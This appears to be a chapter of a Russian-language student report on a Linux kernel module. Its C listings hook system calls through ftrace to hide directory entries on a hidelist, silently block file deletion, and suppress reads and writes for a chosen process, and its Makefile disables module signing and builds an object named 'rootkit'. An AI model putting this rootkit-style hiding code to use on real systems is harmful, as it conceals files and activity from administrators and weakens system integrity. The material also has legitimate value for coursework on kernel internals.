\chapter{Технологический раздел}

\section{Выбор языка и среды программирования}

В качестве языка программирования был выбран язык Си. Для сборки модуля использовалась утилита make. В качестве среды программирования был выбран VSCode.

\section{Реализация алгоритма проверки необходимости сокрытия файла}

В листинге 3.1 приведена реализация алгоритма проверки необходимости сокрытия файла.

\begin{lstlisting}[language=C, frame=single, numbers=left, caption={Реализация алгоритма проверки необходимости сокрытия файла}]
static asmlinkage int fh_sys_getdents64(const struct pt_regs *regs)
{
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
	struct linux_dirent64 *previous_dir = NULL, *current_dir, *dirent_ker = NULL;
	unsigned long offset = 0;
	int ret = real_sys_getdents64(regs);
	
	if (ret <= 0)
	{
		return ret;
	}
	
	dirent_ker = kmalloc(ret, GFP_KERNEL);
	
	if (dirent_ker == NULL)
	{
		return ret;
	}
	
	if (copy_from_user(dirent_ker, dirent, ret) != 0)
	{
		kfree(dirent_ker);
		return ret;
	}
	
	while (offset < ret)
	{
		current_dir = (struct linux_dirent64 *)((char *)dirent_ker + offset);
		
		if (check_fs_hidelist(current_dir->d_name))
		{
			if (current_dir == dirent_ker)
			{
				ret -= current_dir->d_reclen;
				memmove(current_dir, (void *)current_dir + 
				current_dir->d_reclen, ret);
				continue;
			}
			if (previous_dir)
			{
				previous_dir->d_reclen += current_dir->d_reclen;
			}
		}
		else
		{
			previous_dir = current_dir;
		}
		offset += current_dir->d_reclen;
	}
	if (copy_to_user(dirent, dirent_ker, ret) != 0)
	{
		kfree(dirent_ker);
		return ret;
	}
	kfree(dirent_ker);
	return ret;
}
\end{lstlisting}

\section{Реализация алгоритма проверки разрешения на удаление файла}

Реализация алгоритма проверки разрешения на удаление файла представлена в листинге 3.2.

\begin{lstlisting}[language=C, frame=single, numbers=left, caption={Реализация алгоритма проверки разрешения на удаление файла}]
static asmlinkage long fh_sys_unlink(struct pt_regs *regs)
{
	long ret = 0;
	char *kernel_filename = get_filename((void*) regs->di);
	
	if (!kernel_filename)
	{
		return real_sys_unlink(regs);
	}
	
	if (check_fs_blocklist(kernel_filename))
	{
		ret = 0;
		kfree(kernel_filename);
		return ret;
	}
	
	kfree(kernel_filename);
	ret = real_sys_unlink(regs);
	
	return ret;
}
\end{lstlisting}

\section{Реализация алгоритма проверки разрешения на чтение из файла}

Реализация алгоритма проверки разрешения на чтение из файла представлена в листинге 3.3.

\begin{lstlisting}[language=C, frame=single, numbers=left, caption={Реализация алгоритма проверки разрешения на чтение из файла}]
static asmlinkage long fh_sys_read(struct pt_regs *regs)
{
	long ret = 0;
	struct task_struct *task = current;
	
	if (task->pid == target_pid && regs->di == target_fd)
	{
		return 0;
	}
	
	ret = real_sys_read(regs);
	return ret;
}
\end{lstlisting}

\section{Реализация алгоритма проверки разрешения на запись в файл}

Реализация алгоритма проверки разрешения на запись в файл представлена в листинге 3.4.

\begin{lstlisting}[language=C, frame=single, numbers=left, caption={Реализация алгоритма проверки разрешения на запись в файл}]
static asmlinkage long fh_sys_write(struct pt_regs *regs)
{
	long ret = 0;
	struct task_struct *task;
	task = current;
	
	if (task->pid == target_pid && regs->di == target_fd)
	{
		return 0;
	}
	
	ret = real_sys_write(regs);
	return ret;
}
\end{lstlisting}

\section{Инициализация полей структуры ftrace\_hook}

Инициализация полей структуры ftrace\_hook представлена в листинге 3.5.

\begin{lstlisting}[language=C, frame=single, numbers=left, caption={Инициализация полей структуры ftrace\_hook}]
static struct ftrace_hook demo_hooks[] = {
	HOOK("write", fh_sys_write, &real_sys_write),
	HOOK("read", fh_sys_read, &real_sys_read),
	HOOK("open", fh_sys_open, &real_sys_open),
	HOOK("unlink", fh_sys_unlink, &real_sys_unlink),
	HOOK("getdents64", fh_sys_getdents64, &real_sys_getdents64)
};
\end{lstlisting}

\section{Makefile}

В листинге 3.6 представлен Makefile.

\begin{lstlisting}[language=make, frame=single, numbers=left, caption={Makefile}]
CONFIG_MODULE_SIG=0
PWD := $(shell pwd)
KDIR_PATH ?= /lib/modules/$(shell uname -r)/build

obj-m += my_module.o
my_module-objs := main.o rootkit.o

ccflags-y := -Wall -Wno-unused-result -Wno-unused-function -Wno-unused-variable

all:
$(MAKE) -C $(KDIR_PATH) M=$(PWD) modules

clean:
$(MAKE) -C $(KDIR_PATH) M=$(PWD) clean
\end{lstlisting}

